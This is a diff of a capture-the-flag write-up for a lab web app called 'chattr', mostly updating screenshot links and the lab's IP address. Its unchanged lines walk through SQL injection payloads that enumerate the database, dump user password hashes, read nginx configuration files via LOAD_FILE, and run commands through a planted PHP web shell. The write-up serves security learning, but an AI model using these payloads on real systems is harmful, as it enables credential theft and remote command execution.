@@ -69,7 +69,7 @@ Lets start by determine the number of columns we are working with
 
       ') UNION SELECT 1,2,3,4-- -
 
-<img width="1002" height="446" alt="chattr1" src="https://github.com/user-attachments/assets/7996774b-c05a-4005-beb3-cd448f4d2528" />
+<img width="1002" height="443" alt="chattr1" src="https://github.com/user-attachments/assets/59b0c90d-1170-45e0-92e4-c45ab7c32a81" />
 
 - This allows us to break out of the original query with ')
 - Then the UNION SELECT aligns the columns
@@ -80,7 +80,7 @@ Lets try a basic exploit to find the database name with this injection:
 
     ') UNION SELECT 1,2,database(),4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
 
-<img width="1002" height="446" alt="chattr2" src="https://github.com/user-attachments/assets/46979a14-ab4e-443b-ac17-b2db7378bbf2" />
+<img width="1002" height="443" alt="chattr2" src="https://github.com/user-attachments/assets/0fc1bbd2-4230-4142-ac3e-951e5036bb57" />
 
 - This returns "chattr" and more inportantly we've found a way to use an SQL injection to leak info.
 
@@ -99,13 +99,13 @@ The next step is to get the column names for the "Users" table:
 
     ') UNION SELECT 1,2,COLUMN_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="Users"-- - 
 
-<img width="1002" height="733" alt="columns" src="https://github.com/user-attachments/assets/53e64030-eadc-4836-9cf1-206fc68be115" />
+<img width="1002" height="733" alt="columns" src="https://github.com/user-attachments/assets/d6bb39d0-c218-4927-ba16-e2d824eae498" />
 
 Lets inspect the "Username" and "Password"
 
     ') UNION SELECT 1,2,Username,Password FROM chattr.Users-- -
 
-<img width="1002" height="712" alt="passwd" src="https://github.com/user-attachments/assets/fe907284-8954-43e2-811a-5ff60d03eab4" />
+<img width="1002" height="713" alt="passwd" src="https://github.com/user-attachments/assets/e21be696-f966-4daa-b651-76b94717b65a" />
 
 - This gives us the password hashes!
 
@@ -116,7 +116,7 @@ Next, lets see what permissions are avalible with the payload:
 
     ') UNION SELECT 1,2,GRANTEE,PRIVILEGE_TYPE FROM information_schema.USER_PRIVILEGES-- -
 
-<img width="1002" height="446" alt="usrPriv" src="https://github.com/user-attachments/assets/ee519225-0e24-4912-84a9-23c5d03c2e1f" />
+<img width="1002" height="443" alt="usrPriv" src="https://github.com/user-attachments/assets/ca9e85cc-0476-41e2-b3de-36021b756496" />
 
 - This shows that user 'chattr_dbUser'@'localhost' has "FILE" permissions, meaning that we can read and write files.
 
@@ -128,12 +128,12 @@ Next, lets see what permissions are avalible with the payload:
 
         ') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/nginx.conf"),4-- -
 
-<img width="1002" height="733" alt="conf" src="https://github.com/user-attachments/assets/b21a284b-2573-4638-aef5-1000f267afda" />
+<img width="1002" height="733" alt="conf" src="https://github.com/user-attachments/assets/0532f170-4912-4c03-a88e-64d1ce7e30fc" />
 
 - There is a lot in the output, but lets focus on this:
 
-<img width="1002" height="733" alt="confHostPath" src="https://github.com/user-attachments/assets/675b7b86-ca04-4fbd-a11b-1059e6029e1d" />
-  
+<img width="1002" height="733" alt="confHostPath" src="https://github.com/user-attachments/assets/b5c2a112-a7d3-472e-a3dd-e64b1121b9e3" />
+
   - This about the virtual hosts.
       - A virtual host file’s job is to map a hostname to a directory on disk.
       - This directory is the webroot.
@@ -146,7 +146,7 @@ Next, lets see what permissions are avalible with the payload:
 
         ') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -
 
-<img width="1002" height="562" alt="webroot" src="https://github.com/user-attachments/assets/91507a96-0ee2-4bc7-8514-81c07c61c60e" />
+<img width="1002" height="562" alt="webroot" src="https://github.com/user-attachments/assets/95e067a2-2286-4a59-83f1-e5c9533e9dcb" />
 
 - The webroot is: /var/www/chattr-prod
 
@@ -163,14 +163,14 @@ Given that we have write permissions, let have a bit of fun and write some malic
 
     - Command: ls /
  
-          https://154.57.164.78:32157/fSociety.php?0=ls%20/
+          https://154.57.164.68:30411/fSociety.php?0=ls%20/
 
-<img width="1002" height="337" alt="root" src="https://github.com/user-attachments/assets/28763b2b-0977-447c-8cc9-8fa4176f5733" />
+<img width="1002" height="353" alt="root" src="https://github.com/user-attachments/assets/4ccf4bf1-50c6-4d9f-83f6-18df2033e751" />
 
 - The file "flag_876a4c.txt", looks interesting, lets read it.
 
-        https://154.57.164.78:32157/fSociety.php?0=cat%20/flag_876a4c.txt
+        https://154.57.164.68:30411/fSociety.php?0=cat%20/flag_876a4c.txt
 
-<img width="1002" height="337" alt="flag" src="https://github.com/user-attachments/assets/c13edf33-619f-4eff-bdeb-87570750e68b" />
+<img width="1002" height="353" alt="flag" src="https://github.com/user-attachments/assets/58b90b54-50a5-46a7-bb98-cbb453474118" />
 
 - And with that, we've got the flag!
